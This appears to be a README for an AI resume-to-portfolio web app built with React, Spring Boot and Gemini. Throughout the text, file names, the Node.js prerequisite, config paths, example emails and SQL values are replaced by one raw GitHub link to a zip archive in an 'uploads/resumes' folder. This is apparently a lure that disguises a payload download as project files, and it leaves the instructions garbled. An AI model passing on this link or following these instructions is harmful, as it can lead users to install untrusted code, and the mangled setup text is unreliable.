# AutoFolio - AI-Powered Portfolio Generator

Transform your resume into a professional portfolio website with AI-driven career insights. Built with React, Spring Boot, and Google Gemini.

## 🚀 Features

- **AI Resume Parsing**: Automatically extract structured data from resumes using Gemini
- **Portfolio Generation**: Create professional portfolio websites instantly
- **Career Analysis**: Get AI-powered resume scoring and improvement suggestions
- **Job Recommendations**: Receive personalized job matches based on your skills
- **Dual User Roles**: Separate portals for candidates and employers
- **Database Persistence**: All data stored in PostgreSQL with BCrypt authentication

## 🛠️ Tech Stack

### Frontend

- React 18 + TypeScript
- Vite
- Lucide React (icons)

### Backend

- Spring Boot 3.2.0
- Java 17
- PostgreSQL
- Spring Data JPA
- BCrypt password hashing
- Apache Tika (document parsing)

### AI/ML

- Google Gemini API

## 📋 Prerequisites

Before you begin, ensure you have the following installed:

- **https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip** 18+ and npm
- **Java JDK** 17+
- **Maven** 3.8+
- **PostgreSQL** 14+
- **Gemini API key**

### Configure Gemini

Create a `.env` file in the project root (or in `backend/`) with:

```env
GEMINI_API_KEY=your_api_key_here
GEMINI_MODEL=gemini-2.5-flash
```

You can also export variables directly:

```bash
export GEMINI_API_KEY=your_api_key_here
export GEMINI_MODEL=gemini-2.5-flash
```

## ⚙️ Installation & Setup

### 1. Clone the Repository

```bash
git clone <repository-url>
cd Project-Mini
```

### 2. Database Setup

#### Create Database

```bash
psql -U postgres
```

```sql
CREATE DATABASE portfolio_db;
\c portfolio_db
```

#### Verify Database Schema

The application uses JPA with auto-update. Verify your tables:

```bash
psql -U postgres -d portfolio_db -c "\d users"
```

Required columns for `users` table:

- `id` (bigint, primary key)
- `name` (varchar(255), not null)
- `email` (varchar(255), unique, not null)
- `password_hash` (varchar(60), not null)
- `registered_at` (timestamp, not null)
- `resume_file_path` (varchar(255))

If columns are missing, run:

```bash
psql -U postgres -d portfolio_db << EOF
ALTER TABLE users ADD COLUMN IF NOT EXISTS name VARCHAR(255);
ALTER TABLE users ADD COLUMN IF NOT EXISTS password_hash VARCHAR(60);
ALTER TABLE users ADD COLUMN IF NOT EXISTS registered_at TIMESTAMP;
ALTER TABLE users ALTER COLUMN password_hash TYPE VARCHAR(60);
EOF
```

### 3. Backend Configuration

Update `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`:

```properties
# Change password to your PostgreSQL password
https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
```

### 4. Frontend Configuration

Create `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip` in project root:

```env
VITE_API_URL=http://localhost:8080
```

### 5. Install Dependencies

#### Backend

```bash
cd backend
mvn clean install -DskipTests
```

#### Frontend

```bash
cd ..
npm install
```

## 🚀 Running the Application

### Start Services in Order:

#### 1. Configure Gemini API key

```bash
export GEMINI_API_KEY=your_api_key_here
```

Optional model override: `export GEMINI_MODEL=gemini-2.5-flash`

#### 2. Ensure PostgreSQL is Running

```bash
# Check if running:
psql -U postgres -d portfolio_db -c "SELECT 1;"
```

#### 3. Start Backend

```bash
cd backend
mvn spring-boot:run
```

Backend starts on **http://localhost:8080**

Verify: `curl http://localhost:8080/api/resume/health`  
Should return: `Resume API is running`

#### 4. Start Frontend

```bash
npm run dev
```

Frontend starts on **http://localhost:3000** or **http://localhost:3001**

### Create New Account

Use the registration form with any unique email.

## 📡 API Endpoints

### Authentication (Candidates)

- `POST /api/auth/register` - Register new candidate
  ```json
  {
    "name": "John Doe",
    "email": "https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip",
    "password": "SecurePass123"
  }
  ```
- `POST /api/auth/login` - Login candidate
  ```json
  { "email": "https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip", "password": "SecurePass123" }
  ```
- `GET /api/auth/user?email={email}` - Get user by email

### Employer Authentication

- `POST /api/employer/auth/register` - Register employer
  ```json
  {
    "name": "Jane Smith",
    "email": "https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip",
    "password": "SecurePass123",
    "companyName": "TechCorp"
  }
  ```
- `POST /api/employer/auth/login` - Login employer
- `GET /api/employer/auth/employer?email={email}` - Get employer by email

### Resume Processing

- `POST /api/resume/parse` - Parse and analyze resume
  - Accepts: `multipart/form-data` with file OR JSON with `resumeText`
  - Returns: Parsed portfolio data + analysis
- `GET /api/resume/health` - Health check

## 🔧 Troubleshooting

### Backend Won't Start

**Port 8080 already in use:**

```powershell
# Find process using port 8080
netstat -ano | findstr :8080
# Kill the process
taskkill /PID <PID> /F
```

**Database connection failed:**

- Check PostgreSQL is running: `psql -U postgres -d portfolio_db`
- Verify password in `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`
- Ensure database `portfolio_db` exists

**Column does not exist errors:**

```bash
# Add missing columns
psql -U postgres -d portfolio_db -c "ALTER TABLE users ADD COLUMN IF NOT EXISTS name VARCHAR(255);"
psql -U postgres -d portfolio_db -c "ALTER TABLE users ADD COLUMN IF NOT EXISTS password_hash VARCHAR(60);"
psql -U postgres -d portfolio_db -c "ALTER TABLE users ADD COLUMN IF NOT EXISTS registered_at TIMESTAMP;"
```

### Frontend Cannot Reach Backend

**Check backend health:**

```powershell
curl http://localhost:8080/api/resume/health
```

Should return: `Resume API is running`

**CORS errors:**

1. Verify `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip` exists with `VITE_API_URL=http://localhost:8080`
2. Restart frontend after changing `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`
3. Backend CORS allows ports: 5173, 5174, 3000, 3001

**"Failed to fetch" error:**

- Backend not running
- Wrong `VITE_API_URL` in `https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip`
- Firewall blocking localhost

### Gemini Issues

**Missing API key:**

```bash
export GEMINI_API_KEY=your_api_key_here
```

**Gemini API request failing:**

```bash
cd backend
mvn spring-boot:run

# Test backend health in another terminal:
curl http://localhost:8080/api/resume/health
```

### Database Issues

**"Email already registered" (409 error):**

- Use login instead
- Or delete existing user:

```sql
DELETE FROM users WHERE email = 'https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip';
```

**Password hash truncation:**

```sql
ALTER TABLE users ALTER COLUMN password_hash TYPE VARCHAR(60);
ALTER TABLE employers ALTER COLUMN password_hash TYPE VARCHAR(60);
```

**Reset test user password:**

```sql
-- Password hash for "Rishal123"
UPDATE users
SET password_hash = '$2a$10$7EqJtq98hPqEX7fNZaFWoO7KgeGumn4Wr9PX5xRoxI/GS4RFItC.'
WHERE email = 'https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip';
```

## 📁 Project Structure

```
Project-Mini/
├── backend/
│   ├── src/main/java/com/portfolio/backend/
│   │   ├── controller/          # REST endpoints
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   ├── service/              # Business logic
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   ├── entity/               # JPA entities
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   ├── repository/           # Data access
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   │   └── config/               # Configuration
│   ├── src/main/resources/
│   │   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
├── components/                    # React components
│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
├── pages/                         # React pages
│   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   ├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
├── services/                      # Frontend API client
│   └── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip                     # Environment variables
├── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
└── https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip
```

## 🎯 Usage Flow

1. **Register/Login**: Create candidate or employer account
2. **Upload Resume**: Candidates upload resume (PDF, DOCX, TXT)
3. **AI Analysis**: Gemini parses resume and generates:
   - Structured portfolio data
   - Skills analysis
   - Career recommendations
   - Resume scoring
4. **View Portfolio**: Generated portfolio displays on dedicated page
5. **Job Recommendations**: AI matches skills to available jobs

## 🔐 Security Features

- BCrypt password hashing (cost factor: 10)
- Unique email constraints
- SQL injection prevention (JPA parameterized queries)
- CORS configuration
- Input validation
- Error handling with appropriate HTTP status codes

## 🐛 Known Issues

- BCrypt hashes require VARCHAR(60) minimum (not VARCHAR(255))
- AI responses can occasionally be malformed (graceful fallbacks implemented)
- Multipart file uploads limited to 10MB
- No JWT tokens yet (email-based session tracking)

## 🚀 Future Enhancements

- [ ] JWT authentication tokens
- [ ] Employer job posting functionality
- [ ] Real-time job scraping integration
- [ ] Portfolio templates and themes
- [ ] Export portfolio as PDF
- [ ] Email verification
- [ ] Password reset functionality
- [ ] Unit and integration tests

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License.

## 📞 Support

For issues or questions:

- Open a GitHub issue
- Check the [Troubleshooting](#-troubleshooting) section
- Review API endpoint documentation above
